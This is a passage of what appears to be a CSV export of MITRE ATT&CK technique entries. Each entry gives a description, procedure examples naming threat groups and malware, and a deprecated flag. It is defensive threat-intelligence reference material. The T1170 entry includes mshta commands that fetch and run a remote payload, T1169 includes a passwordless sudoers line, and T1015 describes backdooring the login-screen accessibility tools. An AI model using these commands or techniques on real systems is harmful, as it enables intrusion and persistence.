<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>  The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs.  Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.  By default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.  Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading] to make the Registry entries look as if they are associated with legitimate programs.",['creates run key Registry entries pointing to a malicious executable dropped to disk.'],True
T1606,Forge Web Credentials,"Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.  Adversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie] [Steal Application Access Token] and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.  The generation of web credentials often requires secret values, such as passwords, [Private Keys] or other cryptographic seed values. Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials (i.e., [Temporary Elevated Cloud Access] or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.  Once forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material] which may bypass multi-factor and other authentication protection mechanisms.  ",[],False
T1621,Multi-Factor Authentication Request Generation,"Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.  Adversaries in possession of credentials to [Valid Accounts] may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).  In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to “MFA fatigue.”","['[APT29] has used repeated MFA requests to gain access to victim accounts.', 'During [C0027] [Scattered Spider] attempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge.', '[Scattered Spider] has used multifactor authentication (MFA) fatigue by sending repeated MFA authentication requests to targets.', '[LAPSUS$] has spammed target users with MFA prompts in the hope that the legitimate user will grant necessary approval.']",False
T1554,Compromise Host Software Binary,"Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.  Adversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host.  An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching) prior to the binary’s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.","['[WARPWIRE] can embed itself into a legitimate file on compromised Ivanti Connect Secure VPNs.', '[Industroyer] has used a Trojanized version of the Windows Notepad application for an additional backdoor persistence mechanism.', 'During [Cutting Edge] threat actors trojanized legitimate files in Ivanti Connect Secure appliances with malicious code.', '[BUSHWALK] can embed into the legitimate `querymanifest.cgi` file on compromised Ivanti Connect Secure VPNs.', '[Kobalos] replaced the SSH client with a trojanized SSH client to steal credentials on compromised systems.', '[APT5] has modified legitimate binaries and scripts for Pulse Secure VPNs including the legitimate DSUpgrade.pm file to install the ATRIUM webshell for persistence.', '[Kessel] has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.', '[ThiefQuest] searches through the <code>/Users/</code> folder looking for executable files. For each executable, [ThiefQuest] prepends a copy of itself to the beginning of the file. When the file is executed, the [ThiefQuest] code is executed first. [ThiefQuest] creates a hidden file, copies the original target executable to the file, then executes the new hidden file to maintain the appearance of normal behavior. ', '[LITTLELAMB.WOOLTEA] can append malicious components to the `tmp/tmpmnt/bin/samba_upgrade.tar` archive inside the factory reset partition in attempt to persist post reset.', '[Ebury] has been embedded into modified OpenSSH binaries to gain persistent access to SSH credential information.', '[LIGHTWIRE] can imbed itself into the legitimate `compcheckresult.cgi` component of Ivanti Connect Secure VPNs to enable command execution.', '[Bonadan] has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.', '[XCSSET] uses a malicious browser application to replace the legitimate browser in order to continuously capture credentials, monitor web traffic, and download additional modules.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used a trojanized version of Windows Notepad to add a layer of persistence for [Industroyer]', '[FRAMESTING] can embed itself in the CAV Python package of an Ivanti Connect Secure VPN located in `/home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg/cav/api/resources/category.py.`', '[SLOWPULSE] is applied in compromised environments through modifications to legitimate Pulse Secure files.', '[WIREFIRE] can modify the `visits.py` component of Ivanti Connect Secure VPNs for file download and arbitrary command execution.']",False
T1023,Shortcut Modification,Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading] to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.,"[""[FIN7] created several .LNK files on the victim's machine.""]",True
T1026,Multiband Communication,"**This technique has been deprecated and should no longer be used.**  Some adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.","['[PlugX] can be configured to use multiple network protocols to avoid network-based detection.', 'Some [Lazarus Group] malware uses multiple channels for C2, such as RomeoWhiskey-Two, which consists of a RAT channel that parses data in datagram form and a Proxy channel that forms virtual point-to-point sessions.', '[Cobalt Strike] ""beacon"" payload can receive C2 from one protocol and respond on another. This is typically a mixture of HTTP, HTTPS, and DNS traffic.', '[Cobalt Strike] ""beacon"" payload can receive C2 from one protocol and respond on another. This is typically a mixture of HTTP, HTTPS, and DNS traffic.']",
T1122,Component Object Model Hijacking,"The Component Object Model (COM) is a system within Windows to enable interaction between software components through the operating system.  Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.  An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",[],True
T1015,Accessibility Features,"Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.  Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.   Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP).  The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:  For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol] will cause the replaced file to be executed with SYSTEM privileges.   For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for the accessibility program (e.g., ""utilman.exe""). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the ""debugger"" program to be executed with SYSTEM privileges.   Other accessibility features exist that may also be leveraged in a similar fashion:   * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code> * Magnifier: <code>C:\Windows\System32\Magnify.exe</code> * Narrator: <code>C:\Windows\System32\Narrator.exe</code> * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code> * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>",[],True
T1212,Exploitation for Credential Access,"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.   Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.  Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.  Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",[],False
T1590,Gather Victim Network Information,"Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.  Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning] or [Phishing for Information] Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning] or [Search Open Websites/Domains] establishing operational resources (ex: [Acquire Infrastructure] or [Compromise Infrastructure] and/or initial access (ex: [Trusted Relationship]","[""[HAFNIUM] gathered the fully qualified domain names (FQDNs) for targeted Exchange servers in the victim's environment.""]",
T1210,Exploitation of Remote Services,"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.  An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery] or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.  There are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.  Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation] as a result of lateral movement exploitation as well.","['[Flame] can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.', '[WannaCry] uses an exploit in SMBv1 to spread itself to other remote systems on a network.', '[Wizard Spider] has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities.', '[Fox Kitten] has exploited known vulnerabilities in remote services including RDP.', '[Earth Lusca] has used [Mimikatz] to exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472).', '[Stuxnet] propagates using the MS10-061 Print Spooler and MS08-067 Windows Server Service vulnerabilities.', '[QakBot] can move laterally using worm-like functionality through exploitation of SMB.', '[Emotet] has been seen exploiting SMB via a vulnerability exploit like EternalBlue (MS17-010) to achieve lateral movement and propagation. ', '[Empire] has a limited number of built-in modules for exploiting remote SMB, JBoss, and Jenkins servers.', '[Bad Rabbit] used the EternalRomance SMB exploit to spread through victim networks.', '[NotPetya] can use two exploits in SMBv1, EternalBlue and EternalRomance, to spread itself to other remote systems on the network.', '[InvisiMole] can spread within a network via the BlueKeep (CVE-2019-0708) and EternalBlue (CVE-2017-0144) vulnerabilities in RDP and SMB respectively.', '[APT28] exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.', '[Conficker] exploited the MS08-067 Windows vulnerability for remote code execution through a crafted RPC request.', '[PoshC2] contains a module for exploiting SMB via EternalBlue.', '[Lucifer] can exploit multiple vulnerabilities including EternalBlue (CVE-2017-0144) and EternalRomance (CVE-2017-0144).', '[Tonto Team] has used EternalBlue exploits for lateral movement.', '[menuPass] has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472).', '[TrickBot] utilizes EternalBlue and EternalRomance exploits for lateral movement in the modules wormwinDll, wormDll, mwormDll, nwormDll, tabDll.', '[Dragonfly] has exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory servers.', '[MuddyWater] has exploited the Microsoft Netlogon vulnerability (CVE-2020-1472).', '[Threat Group-3390] has exploited MS17-010 to move laterally to other systems on the network.\t', '[FIN7] has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers.']",
T1502,Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.  Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell] to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment] This spoofing could be executed via VBA [Scripting] within a malicious Office document or any code that can perform [Native API]  Explicitly assigning the PPID may also enable [Privilege Escalation] (given appropriate access rights to the parent process). For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.",[],True
T1142,Keychain,"Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.  The <code>security</code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.  To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault.  By default, the passphrase for the keychain is the user’s logon credentials.",[],True
T1534,Internal Spearphishing,"After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating [Impersonation]  For example, adversaries may leverage [Spearphishing Attachment] or [Spearphishing Link] as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture] on sites that mimic login interfaces.  Adversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.","['[Gamaredon Group] has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization.', '[Kimsuky] has sent internal spearphishing emails for lateral movement after stealing victim information.', 'During [Operation Dream Job] [Lazarus Group] conducted internal spearphishing from within a compromised organization.', ""[Leviathan] has conducted internal spearphishing within the victim's environment for lateral movement."", '[HEXANE] has conducted internal spearphishing attacks against executives, HR, and IT personnel to gain information and access.', '[Lazarus Group] has conducted internal spearphishing from within a compromised organization.']",False
T1169,Sudo,"The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the idea of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code> .   Adversaries can take advantage of these configurations to execute commands as other users or spawn processes with higher privileges. You must have elevated privileges to edit this file though.",[],True
T1199,Trusted Relationship,"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.  Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts] used by the other party for access to internal network systems may be compromised and used.  In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.","[""[GOLD SOUTHFIELD] has breached Managed Service Providers (MSP's) to deliver malware to MSP customers."", 'Once [APT28] gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.', ""[Threat Group-3390] has compromised third party service providers to gain access to victim's environments."", '[Sandworm Team] has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.', '[menuPass] has used legitimate access granted to Managed Service Providers in order to access victims of interest.', 'During the [SolarWinds Compromise] [APT29] gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.', '[APT29] has compromised IT, cloud services, and managed services providers to gain broad access to multiple customers for subsequent operations.', '[POLONIUM] has used compromised credentials from an IT company to target downstream customers including a law firm and aviation company.', '[LAPSUS$] has accessed internet-facing identity providers such as Azure Active Directory and Okta to target specific organizations.']",False
T1149,LC_MAIN Hijacking,"**This technique has been deprecated and should no longer be used.**  As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary’s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD  . The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn’t know anything was different  . By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.",[],
T1593,Search Open Websites/Domains,"Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.  Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Technical Databases] establishing operational resources (ex: [Establish Accounts] or [Compromise Accounts] and/or initial access (ex: [External Remote Services] or [Phishing]","['[Sandworm Team] researched Ukraine\'s unique legal entity identifier (called an ""EDRPOU"" number), including running queries on the EDRPOU website, in preparation for the [NotPetya] attack. [Sandworm Team] has also researched third-party websites to help it craft credible spearphishing emails.']",False
T1098,Account Manipulation,"Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials.   In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts]","['[Lazarus Group] malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account.', '[SMOKEDHAM] has added user accounts to local Admin groups.', '[APT41] has added user accounts to the User and Admin groups. ', '[APT3] has been known to add created accounts to local admin groups to maintain elevated access.', 'The [Mimikatz] credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The <code>LSADUMP::ChangeNTLM</code> and <code>LSADUMP::SetNTLM</code> modules can also manipulate the password hash of an account without knowing the clear text value.', '[Magic Hound] has added a user named DefaultAccount to the Administrators and Remote Desktop Users groups.', '[APT5] has created their own accounts with Local Administrator privileges to maintain access to systems with short-cycle credential rotation.', '[Dragonfly] has added newly created accounts to the administrators group to maintain elevated access.', '[FIN13] has assigned newly created accounts the sysadmin role to maintain persistence.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used the `sp_addlinkedsrvlogin` command in MS-SQL to create a link between a created account and other servers in the network.', '[DarkGate] elevates accounts created through the malware to the local administration group during execution.', '[HAFNIUM] has granted privileges to domain accounts.', '[ServHelper] has added a user named ""supportaccount"" to the Remote Desktop Users and Administrators groups.', '[Kimsuky] has added accounts to specific groups with <code>net localgroup</code>.', '[Calisto] adds permissions and remote logins to all users.', '[Sandworm Team] used the <code>sp_addlinkedsrvlogin</code> command in MS-SQL to create a link between a created account and other servers in the network.', '[Dragonfly 2.0] added newly created accounts to the administrators group to maintain elevated access.', ""[Magic Hound] granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations.""]",False
T1170,Mshta,"Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.   Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code        Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code>  They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>  Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. ",[],True
T1048,Exfiltration Over Alternative Protocol,"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.    Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels.   [Exfiltration Over Alternative Protocol] can be done using various common operating system utilities such as [Net] or FTP. On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.  Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API]","['[Bundlore] uses the <code>curl -s -L -o</code> command to exfiltrate archived data to a URL.', '[PoetRAT] has used a .NET tool named dog.exe to exiltrate information over an e-mail account.', '[TeamTNT] has sent locally staged files with collected credentials to C2 servers using cURL.', '[Chaes] has exfiltrated its collected data from the infected machine to the C2, sometimes using the MIME protocol. ', '[FrameworkPOS] can use DNS tunneling for exfiltration of credit card data.', '[Kobalos] can exfiltrate credentials over the network via UDP. ', '[Hydraq] connects to a predefined domain on port 443 to exfil gathered information.', '[AADInternals] can directly download cloud user data such as OneDrive files.']",False
T1097,Pass the Ticket,"Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.  In this technique, valid Kerberos tickets for [Valid Accounts] are captured by [OS Credential Dumping] A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.    Silver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).   Golden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. ",[],True
T1597,Search Closed Sources,"Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.  Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Websites/Domains] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [External Remote Services] or [Valid Accounts]",['[EXOTIC LILY] has searched for information on targeted individuals on business databases including RocketReach and CrunchBase.'],
T1566,Phishing,"Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.  Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules] Another way to accomplish this is by forging or spoofing the identity of the sender which can be used to fool both the human recipient as well as automated security tools.   Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools onto their computer (i.e., [User Execution]","['[Hikit] has been spread through spear phishing.', '[Axiom] has used spear phishing to initially compromise victims.', '[Royal] has been spread through the use of phishing campaigns including ""call back phishing"" where victims are lured into calling a number provided through email.', ""[GOLD SOUTHFIELD] has conducted malicious spam (malspam) campaigns to gain access to victim's machines."", '[Dragonfly] has used spearphising campaigns to gain access to victims.']",False
T1061,Graphical User Interface,"**This technique has been deprecated. Please use [Remote Services] where appropriate.**  The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as [Remote Desktop Protocol] instead of through a [Command and Scripting Interpreter] to search for information and execute files via mouse double-click events, the Windows Run command , or other potentially difficult to monitor interactions.",['[APT3] has interacted with compromised systems to browse and copy files through its graphical user interface in [Remote Desktop Protocol] sessions.'],
T1110,Brute Force,"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.  Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts] within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping] [Account Discovery] or [Password Policy Discovery] Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services] as part of Initial Access.","['[Fox Kitten] has brute forced RDP credentials.', '[HEXANE] has used brute force attacks to compromise valid credentials.', '[Chaos] conducts brute force attacks against SSH services to gain initial access.', '[Caterpillar WebShell] has a module to perform brute force attacks on a system. ', ""[Turla] may attempt to connect to systems within a victim's network using <code>net use</code> commands and a predefined list or collection of passwords."", '[DarkVishnya] used brute-force attack to obtain login data.', 'During [Operation Dream Job] [Lazarus Group] performed brute force attacks against administrator accounts. ', '[FIN5] has has used the tool GET2 Penetrator to look for remote login and hard-coded credentials.', '[Kinsing] has attempted to brute force hosts over SSH.', '[APT38] has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.', '[OilRig] has used brute force techniques to obtain credentials.', '[PoshC2] has modules for brute forcing local administrator and AD user accounts.', '[QakBot] can conduct brute force attacks to capture credentials.', '[APT39] has used Ncrack to reveal credentials.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used a script to attempt RPC authentication against a number of hosts.', '[Dragonfly] has attempted to brute force credentials to gain access.', '[Pysa] has used brute force attempts against a central management console, as well as some Active Directory accounts.', '[CrackMapExec] can brute force supplied user credentials across a network range.', '[APT28] can perform brute force attacks to obtain credentials.', '[Lazarus Group] has performed brute force attacks against administrator accounts.', 'APT34 has used brute force techniques to obtain credentials.', 'Dragonfly dropped and executed Hydra, a password cracker.']",False
T1157,Dylib Hijacking,"macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence.  A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself.    If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.",[],True
T1565,Data Manipulation,"Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.  The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",['[FIN13] has injected fraudulent transactions into compromised networks that mimic legitimate behavior to siphon off incremental amounts of money.'],False
